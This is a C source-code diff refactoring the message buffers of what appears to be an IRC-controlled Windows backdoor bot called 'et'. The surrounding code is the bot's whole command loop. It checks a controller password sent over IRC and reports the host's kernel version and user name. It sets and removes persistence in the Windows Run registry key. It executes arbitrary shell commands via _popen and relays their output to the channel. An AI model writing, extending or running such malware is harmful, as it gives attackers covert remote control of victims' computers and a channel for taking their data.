@@ -16,11 +16,13 @@
 */
 void et_main_loop_win(SOCKET socket, char *nick)
 {
+	char message[IRC_MSGLEN];
 	char buf[1024];
 	char auth = 0;
 
 	while(1)
 	{
+		ZeroMemory(message, IRC_MSGLEN);
 		ZeroMemory(buf, 1024);
 		recv(socket, buf, 1023, 0);
 		buf[1023] = '\0';
@@ -41,27 +43,25 @@ void et_main_loop_win(SOCKET socket, char *nick)
 			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
 			{
 				cmd += 5; /* increment past 'auth ' */
-				char auth_message[IRC_MSGLEN];
 
 				if (!strcmp(cmd, IRC_AUTH))
 				{
 					auth = 1;
-					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
-					send(socket, auth_message, strlen(auth_message), 0);
+					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
+					send(socket, message, strlen(message), 0);
 				}
 				else
 				{
-					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
-					send(socket, auth_message, strlen(auth_message), 0);
+					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
+					send(socket, message, strlen(message), 0);
 				}
 			}
 			else
 			{
 				if (!auth)
 				{
-					char unauth_message[IRC_MSGLEN];
-					_snprintf(unauth_message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
-					send(socket, unauth_message, strlen(unauth_message), 0);
+					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
+					send(socket, message, strlen(message), 0);
 				}
 				else
 				{
@@ -71,28 +71,26 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else if (!strcmp(cmd, "deauth"))
 					{
-						char deauth_message[IRC_MSGLEN];
-						_snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
-						send(socket, deauth_message, strlen(deauth_message), 0);
+						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
+						send(socket, message, strlen(message), 0);
 						auth = 0;
 					}
 					else if (!strcmp(cmd, "info"))
 					{
 						char misc[128];
 						DWORD misc_sz = 128;
-						char info_message[IRC_MSGLEN];
 
 						OSVERSIONINFO kern_info;
 						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 						GetVersionEx(&kern_info);
-						_snprintf(info_message, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
-						send(socket, info_message, strlen(info_message), 0);
-						ZeroMemory(info_message, IRC_MSGLEN);
+						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
+						send(socket, message, strlen(message), 0);
+						ZeroMemory(message, IRC_MSGLEN);
 
 						GetUserName(misc, &misc_sz);
-						_snprintf(info_message, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, misc);
-						send(socket, info_message, strlen(info_message), 0);
-						ZeroMemory(info_message, IRC_MSGLEN);
+						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, misc);
+						send(socket, message, strlen(message), 0);
+						ZeroMemory(message, IRC_MSGLEN);
 						ZeroMemory(misc, misc_sz);
 					}
 					else if (strstr(cmd, "popup"))
@@ -102,8 +100,6 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else if (!strcmp(cmd, "persist"))
 					{
-						char persist_message[IRC_MSGLEN];
-
 						HKEY key = NULL;
 						RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
 						char path[256];
@@ -111,29 +107,25 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						RegSetValueEx(key, "et", 0, REG_SZ, (BYTE *) path, strlen(path));
 						RegCloseKey(key);
 
-						_snprintf(persist_message, IRC_MSGLEN, "PRIVMSG %s :Persist succeeded.\r\n", IRC_CHANNEL);
-						send(socket, persist_message, strlen(persist_message), 0);
+						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Persist succeeded.\r\n", IRC_CHANNEL);
+						send(socket, message, strlen(message), 0);
 					}
 					else if (!(strcmp(cmd, "depersist")))
 					{
-						char depersist_message[IRC_MSGLEN];
-
 						HKEY key = NULL;
 						RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);
 						
 						RegDeleteValue(key, "et");
 						RegDeleteKey(key, "et");
 						RegCloseKey(key);
-						_snprintf(depersist_message, IRC_MSGLEN, "PRIVMSG %s :Successfully removed registry key.\r\n", IRC_CHANNEL);
+						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Successfully removed registry key.\r\n", IRC_CHANNEL);
 
-						send(socket, depersist_message, strlen(depersist_message), 0);
-						ZeroMemory(depersist_message, IRC_MSGLEN);
+						send(socket, message, strlen(message), 0);
+						ZeroMemory(message, IRC_MSGLEN);
 					}
 					else
 					{
 						char cmd_output[IRC_MSGLEN];
-						char cmd_message[IRC_MSGLEN];
-
 						FILE *output_file = _popen(cmd, "rt");
 						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);
 
@@ -148,17 +140,16 @@ void et_main_loop_win(SOCKET socket, char *nick)
 
 						if (strlen(cmd_output) >= 500)
 						{
-							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
+							_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
 						}
 						else
 						{
-							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+							_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
 						}
 
-						send(socket, cmd_message, strlen(cmd_message), 0);
+						send(socket, message, strlen(message), 0);
 						_pclose(output_file);
 						ZeroMemory(cmd_output, IRC_MSGLEN);
-						ZeroMemory(cmd_message, IRC_MSGLEN);
 					}
 				}
 			}
